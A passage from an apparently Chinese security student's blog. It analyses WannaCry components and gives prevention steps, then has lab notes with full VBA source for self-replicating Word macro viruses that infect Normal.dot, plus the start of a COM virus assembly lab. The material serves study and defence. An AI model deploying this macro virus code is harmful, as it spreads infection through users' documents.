*)Memory;  v10 &#x3D; v17;  v11 &#x3D; (char *)Memory;  if ( Memory !&#x3D; v17 )  &#123;  do  &#123;  std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Tidy(v11, 1);  v11 +&#x3D; 16;  &#125;  while ( v11 !&#x3D; v10 );  v7 &#x3D; (char *)Memory;  &#125;  v17 &#x3D; v9;  v24 &#x3D; -1;  v12 &#x3D; v7;  if ( v7 !&#x3D; v9 )  &#123;  do  &#123;                                         &#x2F;&#x2F; 循环清空每一个容器里的内容  std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Tidy(v12, 1);  v12 +&#x3D; 16;  &#125;  while ( v12 !&#x3D; v9 );  v7 &#x3D; (char *)Memory;  &#125;  FreeMem(v7);                                &#x2F;&#x2F; 释放内存  result &#x3D; v14;  &#125;  return result;  &#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>首先，该函数利用了 GetRecyclePathOrTempPah 函数获得了 回收站D:/$RECYCLE 和系统盘历史文件夹的路径C:UsersDingisoAppDataLocalTemp 这两个地址</p></li><li><p>  然后函数会循环两次，判断是否系统中存在其他的盘符。</p></li><li><p>  接着函数利用FindFirstW函数查找目标文件夹中所有的以.WNCRYT结尾的文件</p></li><li><p>  函数会将他遍历的所有的.WNCRYT文件的完整路径和长度存储到一个容器中</p></li><li><p>  当文件遍历结束 会调用DeleteFileW 删除所有容器中记录的项</p></li><li><p>  最后 循环将存放文件的完整路径和长度的容器清空 ，释放资源</p></li></ul><h1 id="8-taskse-exe-病毒辅助文件分析"><a href="#8-taskse-exe-病毒辅助文件分析" class="headerlink" title="8 taskse.exe 病毒辅助文件分析"></a>8 taskse.exe 病毒辅助文件分析</h1><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">signed</span> <span class="token keyword">int</span> __cdecl <span class="token function">sub_401000</span><span class="token punctuation">(</span><span class="token keyword">int</span> argv<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> __int16 Num_5<span class="token punctuation">,</span> <span class="token keyword">int</span> Num_0<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  Advapi32Base <span class="token operator">=</span> <span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span>LibFileName<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取advapi32.dll句柄  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>Advapi32Base <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  Advapi32Base <span class="token operator">=</span> <span class="token function">LoadLibraryA</span><span class="token punctuation">(</span>LibFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 加载advapi32.dll  </span><span class="token operator">*</span>kernel32Base <span class="token operator">=</span> <span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span>kernel32<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>kernel32Base <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  kernel32Base <span class="token operator">=</span> <span class="token function">LoadLibraryA</span><span class="token punctuation">(</span>kernel32<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 加载kernel32.dll  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>kernel32Base <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  hProcess <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>GetCurrentProcess_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>TokenHandle<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取当前进程的伪句柄  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>OpenProcessToken_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 以修改权限的方式 打开进程的令牌  </span><span class="token keyword">goto</span> LABEL_55<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>LookupPrivilegeValueA_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> aSetcbprivilege<span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpLuid<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 获得LUID  </span><span class="token punctuation">&#123;</span>  <span class="token function">local_unwind2</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>ms_exc<span class="token punctuation">.</span>registration<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  NewState <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  lpLuid_1 <span class="token operator">=</span> lpLuid<span class="token punctuation">;</span>  v18 <span class="token operator">=</span> v27<span class="token punctuation">;</span>  v19 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">,</span> _DWORD<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>AdjustTokenPrivileges_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span>  TokenHandle<span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token operator">&amp;</span>NewState<span class="token punctuation">,</span>  <span class="token number">0x10</span><span class="token punctuation">,</span>  <span class="token operator">&amp;</span>PreviousState<span class="token punctuation">,</span>  <span class="token operator">&amp;</span>ReturnLength<span class="token punctuation">)</span> <span class="token punctuation">)</span>                      <span class="token comment">// 提升当前权限  </span><span class="token punctuation">&#123;</span>  <span class="token operator">*</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>WTSQueryUserToken_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span>SessionId<span class="token punctuation">,</span> <span class="token operator">&amp;</span>phToken<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 获取用户的访问令牌  </span><span class="token punctuation">&#123;</span>  <span class="token function">local_unwind2</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>ms_exc<span class="token punctuation">.</span>registration<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> _DWORD<span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>DuplicateTokenEx_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token comment">// 创建一个新的访问令牌  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该文件的主要作用是提权，主要逻辑如下：</p><ul><li><p>  获取必要API函数地址</p></li><li><p>  提上当前的权限</p></li><li><p>  获取当前用户的访问令牌并创建一个新的访问令牌</p></li><li><p>  最后再次提升权限</p></li></ul><h1 id="9-WannaCry-病毒分析总结"><a href="#9-WannaCry-病毒分析总结" class="headerlink" title="9 WannaCry 病毒分析总结"></a>9 WannaCry 病毒分析总结</h1><p>该病毒涉及的相关文件及作用如下：</p><ul><li><p>  msg 病毒的语言包</p></li><li><p>  c.wnry 存储了比特币账户 一个下载链接 跟勒索相关</p></li><li><p>  t.wnry 隐藏了一个dll文件 dll的导出函数是病毒的核心代码</p></li><li><p>  u.wnry 解密器</p></li><li><p>  r.wrny 勒索文档</p></li><li><p>  @WanaDecryptor@.exe 解密器</p></li><li><p>  taskse.exe 提权</p></li><li><p>  taskdl.exe 删除临时文件和回收站的.WNCRY文件</p></li><li><p>  00000000.pky 公钥</p></li><li><p>  00000000.eky 被加密的私钥</p></li><li><p>  00000000.res 八个字节的随机数和当前时间</p></li><li><p>  .bat为解密器创建快捷方式</p></li></ul><p>附上病毒行为的总结图表：</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image20.png" class="" width="20"><h1 id="10-病毒预防及杀毒方案："><a href="#10-病毒预防及杀毒方案：" class="headerlink" title="10 病毒预防及杀毒方案："></a>10 病毒预防及杀毒方案：</h1><ol><li><p> 该病毒利用了永恒之蓝的漏洞，微软官方提供了相应的补丁文件，用户可以通过尽快安全更新的方式防止受到针对此漏洞的病毒的攻击</p></li><li><p>经过我们分析得知，该病毒的传播主要是利用了 445<br> 端口发送病毒本体，关闭端口可以防止我们被攻击。</p></li><li><p>在分析病毒 exe 文件时，病毒加密器在<br> 加密前会进行互斥体检测。检测是否已经有加密器程序存在，这是创建了互斥体<br> MsWinZonesCacheCounterMutexA<br> ，安全软件可以预先创建互斥体，这样加密器在加密前就会自动推出，不会进行加密</p></li></ol><h1 id="11-学习笔记："><a href="#11-学习笔记：" class="headerlink" title="11 学习笔记："></a>11 学习笔记：</h1><h3 id="微软-宏病毒"><a href="#微软-宏病毒" class="headerlink" title="微软 宏病毒"></a>微软 宏病毒</h3><p>病毒主体</p><pre class="line-numbers language-visual" data-language="visual"><div class="caption"><span>basic</span></div><code class="language-visual">&#39; Micro-VirusSub Document_Open()On Error Resume NextApplication. DisplayStatusBar&#x3D;False &#39;屏蔽状态栏Options. SaveNormalPrompt&#x3D;False&#39;修改公用模板时在后台自动保存，不给任何提示Ourcode &#x3D;ThisDocument. VBProject. VBComponents(1). CodeModule.Lines(1,100)&#39;获取当前文档代码对象Set Host &#x3D;NormalTemplate. VBProject. VBComponents(1). CodeModule&#39;获取共用模板的代码对象If ThisDocument &#x3D;NormalTemplate Then&#39;判断当前文件是否等于公用模板对象Set Host&#x3D;ActiveDocument. VBPro ject. VBComponents(1). CodeModule&#39;如果是，则获取当前活动文档的代码对象End IfWith HostIf. Lines(1.1)&lt;&gt;&quot;Micro-Virus&quot;Then &#39;判断当前文档是否感染病毒. Deletelines 1,. CountOfLines &#39;如果不是，就清除原来的代码. Insertlines 1, Ourcode&#39;嵌入病毒代码. Replaceline 2,&quot;Sub Document_Close()&quot;&#39;更换If ThisDocument&#x3D;nomaltemplate Then &#39;判断当前的文档是否是公用模块. ReplaceLine 2,&quot;Sub Document_Open()&quot;ActiveDocument. SaveAs ActiveDocument. FullNameEnd IfEnd IfEnd WithMsgBox &quot;MicroVirus by Content Security Lab&quot;End Sub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="病毒分析"><a href="#病毒分析" class="headerlink" title="病毒分析"></a>病毒分析</h3><p>2.4该代码的基本执行流程如下：<br>1）进行必要的自我保护。高明的病毒编写者其自我保护将做得非常好，可以使word的一些工具栏失效，例如将工具菜单中的宏选项屏蔽，也可以修改注册表达到很好的隐藏效果。本例中只是屏蔽状态栏，以免显示宏的运行状态，并且修改公用模板时自动保存，不给用户提示。</p><pre class="line-numbers language-visual" data-language="visual"><div class="caption"><span>basic</span></div><code class="language-visual">Application.DisplayStatusBar&#x3D;False Options.SaveNormalPrompt&#x3D;False<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）得到当前文档的代码对象和公用模板的代码对象。</p><p>2）得到当前文档的代码对象和公用模板的代码对象。</p><pre class="line-numbers language-visual" data-language="visual"><div class="caption"><span>basic</span></div><code class="language-visual">Ourcode&#x3D;ThisDocument.VBProject.VBComponents（1）.CodeModule.Lines（1，100）Set Host&#x3D;NormalTemplate.VBPro ject.VBComponents（1）.CodeModuleIf ThisDocument &#x3D;NormalTemplate ThenSet Host&#x3D;ActiveDocument.VBProject.VBComponents（1）.CodeModuleEnd If<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）检查模板是否已经感染病毒，如果没有，则复制宏病毒代码到模板，并且修改函数名。</p><pre class="line-numbers language-visual" data-language="visual"><div class="caption"><span>basic</span></div><code class="language-visual">With HostIf.Lines（1.1）&lt;）&quot;&quot;Micro-Virus&quot;Then.Deletelines 1，.CountOfLines.InsertLines 1，Ourcode.ReplaceLine 2，&quot;Sub Document_Close（）&quot;If ThisDocument&#x3D;nomaltemplate Then.ReplaceLine 2，&quot;Sub Document_open（）&quot;ActiveDocument.SaveAs ActiveDocument.Ful1NameEnd IfEnd IfEnd With<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4）执行恶意代码。</p><pre class="line-numbers language-visual" data-language="visual"><div class="caption"><span>basic</span></div><code class="language-visual">MsgBox&quot;MicroVirus by Content Security Lab&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.5此时当前word文档就含有宏病毒，只要下次打开这个word文档，就会执行以上代码，并将自身复制到Normal.dot（word文档的公共模板）和当前文档的ThisDocument中，同时改变函数名（模板中为Document<em>Close，当前文档为Document</em>Open），此时所有的word文档打开和关闭时，都将运行以上的病毒代码，可以加入适当的恶意代码，影响word的正常使用，本例中只是简单的跳出一个提示框。将当前文档关闭再重新打开，弹出一个提示框，且屏蔽了状态栏</p><h3 id="宏病毒分析2"><a href="#宏病毒分析2" class="headerlink" title="宏病毒分析2"></a>宏病毒分析2</h3><p>找到一个类似于给出病毒的实现并进行分析</p><pre class="line-numbers language-visual" data-language="visual"><div class="caption"><span>basic</span></div><code class="language-visual">&#39;moonlightDim nm(4)Sub Smallboy_Virus()&#39;屏蔽状态栏，以免显示宏病毒执行状态；修改公用模版是自动保存且不提示；自动执行病毒模板On Error Resume NextApplication.DisplayStatusBar &#x3D; False&#39;屏蔽状态栏Options.SaveNormalPrompt &#x3D; False&#39;修改公用模板时在后台自动保存，不给任何提示Ourcode &#x3D; ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1,100)&#39;获取当前文档代码对象Set host &#x3D; NormalTemplate.VBProject.VBComponents(1).CodeModule&#39;获取共用模板的代码对象&#39;&#39;获取当前文档对象代码和共用模板对象代码If ThisDocument &#x3D; NormalTemplate Then&#39;判断当前文件是否等于公用模板对象Set host &#x3D; ActiveDocument.VBProject.VBComponents(1).CodeModule&#39;如果是，则获取当前活动文档的代码对象End If&#39;&#39;设立检查当前文档是否被感染，如果没有就自动执行复制宏病毒到模板并修改函数名操作With hostIf .Lines(1.1) &lt;&gt; &quot;Smallboy_Virus()&quot; Then&#39;判断当前文档是否感染病毒.deletelines 1, .countoflines&#39;如果不是，就清除原来的代码.insertlines 1, .OurcodeLines&#39;嵌入病毒代码.replaceline 2, &quot;Sub Smallboy_Virus()&quot;&#39;更换 Smallboy_VirusIf ThisDocument &#x3D; NormalTemplate Then&#39;判断当前的文档是否等于公用模块.replaceline 2, &quot;Sub Smallboy_Virus()&quot;&#39;如果是，则替换为 Smallboy_VirusActiveDocument.SaveAs ActiveDpcument.FullName&#39;保存文档，并修改函数名（）End IfEnd IfEnd With&#39;*弹出第一个框*MsgBox &quot;！！！&quot;&#39;*定义算数数据成员*Count &#x3D; 0 &#39;定义count&#x3D;0try: &#39;执行try语句On Error GoTo 0On Error GoTo trytest &#x3D; -1 &#39;初始化并定义text&#x3D;-1con &#x3D; 1 &#39;初始化并定义con&#x3D;1tog$ &#x3D; &quot;&quot; &#39;初始化tog$i &#x3D; 0 &#39;初始化并定义i&#x3D;0&#39;开始执行算术数据成员的行循环语句While test &#x3D; -1&#39;因为之前已经定义了test&#x3D;-1，所以肯定会先执行一次while循环For i &#x3D; 0 To 4&#39;执行一个for循环nm(i) &#x3D; Int(Rnd() * 100)&#39;将rnd（）*100的正整数结果赋值给数组nm（i）con &#x3D; con * nm(i)&#39;将con*nm(i)的值传回给conIf i &#x3D; 4 Then&#39;如果i&#x3D;4,也就是for循环结束之后，开始执行if下的语句tog$ &#x3D; tog$ + Str$(nm(4)) + &quot;&#x3D;?&quot;&#39;将tog$和Str$( nm(4))+字符串&quot;&#x3D;？&quot;的值都传给tog$GoTo beg &#39;执行beg语句End If &#39;上一个if判断语句执行结束tog$ &#x3D; tog$ + Str$(nm(i)) + &quot;*&quot;&#39;将tog$和Str$( nm(4))+字符串&quot;*&quot;的值都传给tog$Next i &#39;返回for循环beg:&#39;显示第二个对话框，进行答题判断Beepans$ &#x3D; InputBox(&quot;今天是&quot; + Date$ + &quot;，我们玩个心算游戏可好？&quot; +Chr$(13) + &quot;如果你答错了，我将代表月亮消灭你！&quot; + Chr$(13) + tog$, &quot;Smallboy&quot;)&#39;显示心算题，和输入心算结果&#39;*输入运算结果后将要执行的语句&#39;If RTrim$(LTrim$(ans$)) &#x3D; LTrim$(Str$(con)) Then&#39;判断ans$与con是否相等，这是是主要的if判断语句，是下面进行操作的主要依据&#39;输入答案正确后将要执行的语句&#39;*MsgBox &quot;恭喜你答对了！！！&quot;&#39;设置文本格式，字体&#39;Documents.AddSelection.Paragraphs.Alignment &#x3D; wdAlignParagraphCenter&#39; 设置居中对齐BeepWith Selection.Font&#39;设置文本字体.Name &#x3D; &quot;黑体&quot;&#39;设置文本字体为黑体.Size &#x3D; 16&#39;设置文本字体大小为16.Bold &#x3D; 1&#39;设置文本字体为粗体.Underline &#x3D; 1&#39;设置文本字体为下划线.Color &#x3D; wdColorRose&#39;设置文本字体问玫瑰红色End WithSelection.InsertAfter Text &#x3D; &quot;什么是宏病毒？&quot; &#39;嵌入文本Selection.InsertParagraphAfter &#39;换行BeepSelection.InsertAfter Text:&#x3D;&quot;答案：&quot; &#39;嵌入文本Selection.Font.Italic &#x3D; 1 &#39;设置文本字体为斜体Selection.InsertAfter Text:&#x3D;&quot;我就是&quot; &#39;嵌入文本Selection.InsertParagraphAfter &#39;换行Selection.InsertParagraphAfter &#39;换行Selection.Font.Italic &#x3D; 0 &#39;撤销文本为斜体BeepSelection.InsertAfter Text:&#x3D;&quot;如何防御宏病毒&quot; &#39;嵌入文本Selection.InsertParagraphAfter &#39;换行Selection.InsertParagraphAfter &#39;换行BeepSelection.InsertAfter Text:&#x3D;&quot;答案：&quot; &#39;嵌入文本Selection.Font.Italic &#x3D; 1 &#39;设置文本字体为斜体Selection.InsertAfter Text:&#x3D;&quot;别看我&quot; &#39;嵌入文本MsgBox &quot;按确定键，我将告诉你一个秘密......&quot;, &quot;好吧，告诉你吧！&quot;GoTo out &#39;退出goto语句&#39;输入答案不正确后将要执行的语句Else &#39;执行else语句，也就是回答错误后将要执行的Count &#x3D; Count + 1 &#39;count++，本来count初始化为0For j &#x3D; 1 To 20 &#39;执行循环语句，循环20次BeepDocuments.Add &#39;增加一个现在这个文档Next jSelection.Paragraphs.Alignment &#x3D; wdAlignParagraphCenter&#39;设置文本格式为居中对齐Selection.InsertAfter Text:&#x3D;&quot;宏病毒&quot; &#39;嵌入一个文本If Count &#x3D; 2 Then GoTo out&#39;判断是否执行打开该文本操作够2个20次，如果够了就退出goto语句GoTo tryWordBasic.filedefault &#39;退出WordBasic文本End IfWend &#39;结束with语句out: &#39;退出End Sub &#39;退出Sub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>学习了宏病毒的结构 和 去除宏病毒的方法</p><p>结构</p><ul><li><p>  屏蔽状态栏，以免显示宏病毒执行状态；修改公用模版是自动保存且不提示；自动执行病毒模板</p></li><li><p>  判断是否是 公用模板 ，否则复制到共用模板</p></li><li><p>  通过首行内容判断是否感染病毒</p></li><li><p>  执行病毒主体</p></li></ul><p>利用多开窗口等方式耗尽系统资源以影响使用</p><h2 id="COM病毒实验"><a href="#COM病毒实验" class="headerlink" title="COM病毒实验"></a>COM病毒实验</h2><ol><li>COM文件的特点</li></ol><p>COM文件是DOS的一种二进制代码的可执行文件，COM文件结构比较简单，加载过程十分迅速。整个程序只有一个段。因此全部代码长度必须小于64K，其入口代码地址是CS:100H。DOS装入COM文件时，先在内存建立一个长度为100H的程序前缀段(PSP，由DOS建立，是DOS用户程序和命令行之间的接口)，然后将整个文件装载于PSP上端，不进行重定位操作，接着将四个段地址寄存器DS(Data<br>Segment)，CS(Code Segment)，SS(Stack Segment)，ES(Extra Segment)初始化为程序前缀段(PSP)的段地址，最后将程序的控制权交于CS:100H处。如表一所示：</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image21.png" class="" width="21"><p>表1：COM病毒的装入和执行</p><ol start="2"><li>病毒原理</li></ol><p>COM病毒感染一般有两种途径，一种是将自身代码附加到宿主程序之前，病毒执行完后恢复寄生程序原先的状态，并用JMP<br>FAR等指令使程序再次回到CS:100H处，以确保寄生程序与PSP的一致。但更为常见的病毒为采用保存文件头若干字节，并将第一条指令改为”JMP<br>病毒入口”，以确保病毒最先执行。病毒执行完后，会恢复并运行原文件，以便传播，当其将原文件参数全部恢复后，会将控制权交于CS:100H处。</p><h4 id="带感染的COM文件"><a href="#带感染的COM文件" class="headerlink" title="带感染的COM文件"></a>带感染的COM文件</h4><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">proqram seqmentassume cs:program,ds:program,ss:program,es:programorg 0100h # 置程序的初值为100h，开始程序的运行MOV AX, SEG MESSAGE # 将 message 段地址赋给AX寄存器MOV DS, AX #MOV DX, offset message #将偏移量赋给 DXMOV AH, 09h #打印字符串INT 21hMOV AH, 4Ch # 终止程序 返回 DOSINT 21hRETmessage db&quot;This a simple com program for a test ???&quot;,0dh,0ah,&quot;$&quot;program endsEND<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>病毒的ASM文件</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">CSEG SEGMENTASSUME CS:CSEG,DS:CSEG,SS:CSEGmain PROC NEARmainstart:CALL vstart ;病毒代码开始处vstart:POP SI #得到当前地址MOV BP,SI #保存当前地址PUSH SIMOV AH,9ADD SI,OFFSET message-OFFSET vstart #显示预设字符串MOV DX,SIINT 21hPOP SIADD 